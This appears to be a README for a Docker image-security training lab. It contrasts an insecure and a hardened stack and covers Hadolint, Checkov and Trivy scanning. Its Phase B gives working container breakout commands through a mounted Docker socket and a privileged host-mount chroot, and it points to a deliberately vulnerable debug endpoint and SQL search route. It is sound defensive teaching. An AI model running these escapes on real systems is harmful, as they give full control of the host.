# Hands-On Example Stack


- Use: https://docs.docker.com/build/building/best-practices/#dockerfile-instructions
- include the dockerfile best practices https://docs.docker.com/reference/dockerfile/#add
- https://github.com/ltfe-ict-academy/cloud-docker-kubernetes/tree/main/Part_06_Building_Images#understand-how-cmd-and-entrypoint-interact
- images that run as root by default, show USER in the Dockerfile
- smaller base image
- no `COPY . .`
- narrow build context via `Dockerfile.hardened.dockerignore`
- no `.env` in the build context
- no unnecessary shell tools or editors
- explicit non-root runtime user
-  Minimize The Runtime Image

- https://github.com/hadolint/hadolint
- https://www.checkov.io/7.Scan%20Examples/Dockerfile.html

## Using build variables
- https://docs.docker.com/build/building/variables/

> We will show how to use build secret variables in the Part 4 of the course.

## Hadolint

Hadolint is a Dockerfile linter that parses Dockerfiles into an abstract syntax tree and applies rules on top of that structure. It also uses ShellCheck to lint shell code inside RUN instructions.

Run Hadolint with Docker:

sudo docker run --rm -i hadolint/hadolint < Dockerfile

Or install it locally and run:

hadolint Dockerfile

Example CI step:

hadolint Dockerfile
hadolint docker/*.Dockerfile

What Hadolint is good for:

catching common Dockerfile mistakes,
enforcing package-manager cleanup patterns,
detecting unpinned packages in some contexts,
warning about risky ADD usage,
linting shell commands in RUN,
improving Dockerfile consistency across teams.

Hadolint is not a supply-chain scanner. It does not prove that dependencies are safe. It helps prevent known Dockerfile antipatterns before they become images.

Checkov

Checkov supports Dockerfile configuration scanning. Its Dockerfile checks validate whether Dockerfiles comply with best practices such as not running as root, including a health check, and not exposing SSH port 22. The documented CLI usage is checkov -d . --framework dockerfile.

Install:

pipx install checkov

Scan the current directory:

checkov -d . --framework dockerfile

Scan a specific Dockerfile:

checkov -f Dockerfile --framework dockerfile

Example CI step:

checkov -d . --framework dockerfile --quiet

What Checkov is good for:

policy-style Dockerfile checks,
CI/CD enforcement,
finding risky configuration patterns,
unifying Dockerfile checks with other IaC checks.

Hadolint and Checkov overlap, but they are not identical. A practical baseline is to run both:

hadolint Dockerfile
checkov -f Dockerfile --framework dockerfile

## Use the build cache intentionally

Build cache is useful, but it can also hide stale assumptions. Docker steps through Dockerfile instructions in order and checks whether each instruction can be reused from the build cache. Once cache is invalidated, Docker executes that instruction and the following instructions again.

This means instruction ordering affects both speed and security.

Less efficient pattern:

FROM python:3.12-slim-bookworm

WORKDIR /app
COPY . .
RUN pip install -r requirements.txt

CMD ["python", "app.py"]

Any application code change invalidates the COPY . . layer, which also invalidates the dependency installation layer.

Better pattern:

FROM python:3.12-slim-bookworm

WORKDIR /app

COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY app.py .

CMD ["python", "app.py"]

Now dependency installation is cached separately from application code. This is faster, but it also makes dependency changes more visible in code review.

### Step 4: Scan Both Images

```bash
trivy image --scanners vuln,secret,misconfig image-problem:insecure
trivy image --scanners vuln,secret,misconfig image-problem:hardened
```

| Practice                                  | Why It Matters                                                       |
| ----------------------------------------- | -------------------------------------------------------------------- |
| Use trusted base images                   | Reduces risk from abandoned or malicious upstream images.            |
| Pin meaningful versions                   | Avoids accidental drift from `latest`.                               |
| Pin digests for production                | Gives exact artifact identity.                                       |
| Keep build context small                  | Prevents accidental inclusion of secrets and internal files.         |
| Use `.dockerignore`                       | Reduces context size and exposure.                                   |
| Prefer `COPY` over `ADD`                  | Makes file inclusion more explicit.                                  |
| Avoid `curl \| sh`                        | Prevents unverified remote code execution during build.              |
| Verify downloads                          | Use checksums, signatures, or trusted package repositories.          |
| Use multi-stage builds                    | Keeps compilers and build tools out of runtime images.               |
| Run as non-root                           | Reduces impact of application compromise.                            |
| Avoid secrets in `ARG`, `ENV`, and `COPY` | These can persist in metadata or layers.                             |
| Use BuildKit secrets                      | Provides temporary build-time secret access.                         |
| Add OCI labels                            | Improves ownership, auditability, and incident response.             |
| Rebuild regularly                         | Pulls in base and package fixes after vulnerabilities are disclosed. |


Dockerfiles And Build Best Practices

A Dockerfile is a build script. It is not merely a recipe for the final image.

Docker’s reference describes a Dockerfile as a text document containing commands a user could call on the command line to assemble an image. Instructions include FROM, RUN, COPY, ADD, ENV, USER, ENTRYPOINT, CMD, and others. Docker also states that instructions run in order and that FROM specifies the base image from which you are building.

That order matters because it controls layers, cache behavior, file inclusion, and often security outcomes.

Bad example
FROM python:latest

WORKDIR /app
COPY . .

RUN pip install -r requirements.txt
RUN rm -f .env

ENV API_TOKEN=dev-token
CMD python app.py

Problems:

python:latest is mutable.
COPY . . copies the whole context.
.env may already be in a previous layer.
ENV API_TOKEN=... persists in image metadata.
It runs as root by default unless the base image changes that.
Build and runtime dependencies are mixed.
Dependency versions may not be pinned.
There is no clear ownership, version, source, or SBOM.

Docker explicitly warns that secrets should not be used in ARG or ENV because they persist in the final image, and recommends secret mounts instead.

Better example
# syntax=docker/dockerfile:1.8

FROM python:3.12-slim-bookworm AS builder

WORKDIR /build

COPY requirements.txt .
RUN --mount=type=cache,target=/root/.cache/pip \
    pip wheel --no-cache-dir --wheel-dir /wheels -r requirements.txt

FROM python:3.12-slim-bookworm

LABEL org.opencontainers.image.title="course-backend"
LABEL org.opencontainers.image.description="Training backend service"
LABEL org.opencontainers.image.source="https://example.com/course/backend"

WORKDIR /app

RUN groupadd --system app \
    && useradd --system --gid app --home-dir /app app

COPY --from=builder /wheels /wheels
COPY requirements.txt .
RUN pip install --no-cache-dir --no-index --find-links=/wheels -r requirements.txt \
    && rm -rf /wheels

COPY app.py .

USER app
EXPOSE 8080
ENTRYPOINT ["python", "app.py"]

This is not perfect, but it demonstrates better patterns:

versioned base image
multi-stage build
narrower copy operations
no .env
no secrets in ARG or ENV
runtime user is non-root
labels add useful metadata
build cache is used for performance without copying unnecessary files into the runtime image

OWASP’s Docker Security Cheat Sheet recommends CI/CD scanning and Dockerfile checks such as ensuring a USER directive exists, pinning the base image version, pinning OS package versions, avoiding ADD in favor of COPY, and avoiding curl-bashing in RUN directives.

Minimum 2026 Baseline For Image Pipelines

For a professional container image pipeline, the minimum baseline should look like this:

Build from an approved base image.
Pin a meaningful base version; resolve and record the digest.
Use a small, maintainable runtime base.
Keep the build context narrow with .dockerignore.
Avoid secrets in ARG, ENV, COPY, logs, and layers.
Use BuildKit secret mounts for temporary build credentials.
Use multi-stage builds to keep toolchains out of runtime images.
Run as a non-root user by default.
Generate SBOM and provenance attestations.
Scan for vulnerabilities, secrets, and misconfigurations.
Fail CI on policy-breaking findings.
Push only to governed registries.
Sign the pushed digest.
Deploy by digest, not by mutable tag.
Re-scan and rebuild regularly.

OWASP’s supply-chain guidance for Docker specifically calls out provenance, SBOM generation, image signing, trusted registries, and secure deployment policy as key practices across the image lifecycle.



The most important security ideas from this chapter are:

Images have structure: manifests, configs, indexes, layers, tags, and digests.
Tags are convenient names; digests are exact identities.
Layers preserve history, and deleted files may still exist in lower layers.
Base images are security dependencies.
Build context is part of the attack surface.
Dockerfiles are build scripts and should be reviewed like code.
Secrets must not enter images through COPY, ARG, or ENV.
SBOMs help you know what you shipped.
Scanners are essential evidence, but not complete truth.
Mature teams rebuild, scan, sign, attest, and deploy by digest.


## Folder Layout

```text
90_Hands_On_Example_Stack/
├── README.md
├── .env.example
├── compose.insecure.yaml
├── compose.production.yaml
├── backend/
│   ├── .dockerignore
│   ├── app.py
│   ├── Dockerfile
│   ├── Dockerfile.insecure
│   └── requirements.txt
├── frontend/
│   ├── .dockerignore
│   ├── app.js
│   ├── Dockerfile
│   ├── Dockerfile.insecure
│   ├── index.html
│   ├── nginx.conf
│   └── styles.css
└── db/
    └── init/
        └── 01-schema.sql
```

## Before You Start

This folder includes deliberate breakout demonstrations.

Do not run the escape demos:

- on your workstation
- on a shared Docker host
- on a production-like environment

Use a disposable lab VM only.

The goal is to teach reliable real-world breakout conditions caused by bad configuration, not to run unstable kernel-CVE party tricks.

## Step 1: Prepare The Environment File

Create `.env` from the example file.

Linux or macOS:

```bash
cp .env.example .env
```

PowerShell:

```powershell
Copy-Item .env.example .env
```

## Phase A: Explore The Insecure Build

### Step 2: Start The Insecure Stack

```bash
docker compose -f compose.insecure.yaml up --build -d
```

This produces local images named:

- `course-frontend:day2-insecure`
- `course-backend:day2-insecure`

### Step 3: Review The Running Services

```bash
docker compose -f compose.insecure.yaml ps
docker compose -f compose.insecure.yaml logs backend
docker compose -f compose.insecure.yaml logs frontend
```

The insecure version still exposes too much directly to the host:

- frontend `3000`
- backend `8000`
- PostgreSQL `5432`
- Redis `6379`

That is useful for analysis because it makes the weak assumptions highly visible.

### Step 4: Inspect The Images

```bash
docker image ls course-backend:day2-insecure course-frontend:day2-insecure
docker image history --no-trunc course-backend:day2-insecure
docker image history --no-trunc course-frontend:day2-insecure
docker image inspect course-backend:day2-insecure
docker image inspect course-frontend:day2-insecure
```

Things to call out during the lecture:

- the backend image is built from a broad Python base
- the frontend image uses `nginx:latest`
- both images are mutable-tag based
- the backend runs as root
- the frontend insecure build copies the entire folder into the static web root
- the backend still receives database credentials through environment variables

### Step 5: Look For Evidence Of Sloppy Build Context

Inside the insecure frontend container:

```bash
docker run --rm course-frontend:day2-insecure ls -la /usr/share/nginx/html
```

Inside the insecure backend container:

```bash
docker run --rm course-backend:day2-insecure sh -c "id && env | sort"
```

What to notice:

- build-time and source files can land in the runtime image
- the process runs as root
- connection details are easy to extract from the container environment

### Step 6: Scan The Insecure Images

With Trivy:

```bash
trivy image course-backend:day2-insecure
trivy image course-frontend:day2-insecure
```

Useful follow-up:

```bash
trivy image --scanners vuln,secret,misconfig course-backend:day2-insecure
```

This is a good place to reinforce an important habit:

- scanner output is evidence
- scanner output is not truth

Participants should inspect the build and the runtime assumptions, not just the CVE list.

### Step 7: Explore The App-Level Problems We Still Have

The backend is the same app from Part 01, which means it still includes:

- a debug endpoint
- unsafe SQL query construction in the search route
- plain-text connection strings in environment variables

Try them again:

```bash
curl http://localhost:8000/api/admin/debug
curl "http://localhost:8000/api/products/search?q=red"
```

These are not image problems by themselves, but they show how weak images and weak applications often travel together.

## Phase B: Demonstrate Reliable Breakout Misconfigurations

The escape services are not started by default. They are attached to the `escape` profile.

### Demo 1: Docker Socket Breakout

Start the socket-backed helper container:

```bash
docker compose -f compose.insecure.yaml --profile escape up -d socket-breakout
```

Now use the Docker socket from inside the container:

```bash
docker compose -f compose.insecure.yaml exec socket-breakout docker ps
```

That already proves the point:

- if a container can control the Docker daemon socket, it can usually control the host

To make the impact concrete:

```bash
docker compose -f compose.insecure.yaml exec socket-breakout \
  docker run --rm -v /:/host alpine:3.21 chroot /host sh -c "id && hostname && ls /"
```

Why this matters:

- mounting `/var/run/docker.sock` is effectively host control
- many teams do this for "convenience"
- this is one of the most common self-inflicted breakout patterns in real environments

### Demo 2: Privileged Host-Filesystem Breakout

Start the privileged host-mount lab service:

```bash
docker compose -f compose.insecure.yaml --profile escape up -d host-breakout
```

Enter it:

```bash
docker compose -f compose.insecure.yaml exec host-breakout sh
```

Inside the container:

```sh
chroot /host sh
id
hostname
```

Why this matters:

- `privileged: true`
- host root filesystem mounts
- host PID namespace sharing

is not "a little unsafe"

It is direct host compromise territory.

These demos are intentionally configuration-driven because they are reliable, teach the right lesson, and do not depend on whether a specific kernel escape CVE happens to work on the lab machine.

## Phase C: Rebuild The Same App Properly

### Step 8: Stop The Insecure Stack

```bash
docker compose -f compose.insecure.yaml down
```

### Step 9: Build The Production-Grade Image Set

```bash
docker compose -f compose.production.yaml build --pull
docker compose -f compose.production.yaml up -d
```

This produces:

- `course-frontend:day2-prod`
- `course-backend:day2-prod`

### Step 10: Compare The New Images

```bash
docker image ls course-backend:day2-insecure course-backend:day2-prod
docker image ls course-frontend:day2-insecure course-frontend:day2-prod
docker image history --no-trunc course-backend:day2-prod
docker image history --no-trunc course-frontend:day2-prod
```

Key improvements in the production-grade rebuild:

- narrower base images
- pinned major-version tags instead of `latest`
- multi-stage backend build
- a dedicated `.dockerignore`
- no broad `COPY . .` in the final images
- explicit runtime user for the backend image
- gunicorn instead of Flask development server
- frontend served through a minimal custom Nginx configuration
- database and Redis are no longer published to the host

### Step 11: Scan The New Images Again

```bash
trivy image course-backend:day2-prod
trivy image course-frontend:day2-prod
```

Discuss the difference carefully:

- fewer findings is useful
- smaller images are useful
- better layering is useful
- but we still have not solved network segmentation, runtime hardening, or secret management yet

That is why the rest of the course still matters.

## What Changed Technically

### Backend Image

The backend now:

- builds dependencies into a virtual environment in a builder stage
- copies only the runtime pieces into the final stage
- runs as a non-root user
- serves with gunicorn

### Frontend Image

The frontend now:

- stops using `nginx:latest`
- copies only the static assets it actually needs
- serves them on port `8080` via a minimal Nginx config

### Compose Handling

The production compose file now:

- uses health checks
- waits for dependencies to become healthy
- avoids publishing PostgreSQL and Redis
- uses explicit image tags so participants can inspect them directly

## Concepts To Reinforce During The Lab

- a working image can still be a dangerous image
- mutable tags are convenient but weak for identity
- running as root expands post-compromise options
- the Docker socket is a privilege boundary, not a convenience file
- privileged containers and host mounts are often functionally equivalent to host access
- production-grade image handling starts before runtime hardening begins

## Suggested Exercises

1. Use `docker image save` on the insecure backend image and inspect the resulting tarball.
2. Compare the `docker image history` output of the insecure and production backend images line by line.
3. Remove the `.dockerignore` file from the hardened build and observe what changes in the image content and build context.
4. Explain why the production image is better even though the backend application code itself is still not fully hardened.

## Teardown

Stop the production stack:

```bash
docker compose -f compose.production.yaml down
```

Stop the insecure stack and clean its volume:

```bash
docker compose -f compose.insecure.yaml down -v
```

## What We Still Haven't Solved

Part 03 will focus on:

- network segmentation
- a dedicated edge proxy
- better host exposure patterns
- Docker-aware host firewall rules

Part 04 will focus on:

- exploiting the weak web behavior still present in the app
- runtime hardening
- secrets handling
- observability and monitoring

After Part 02, participants should understand a crucial lesson:

image security is not a packaging detail

it is part of the attack surface.
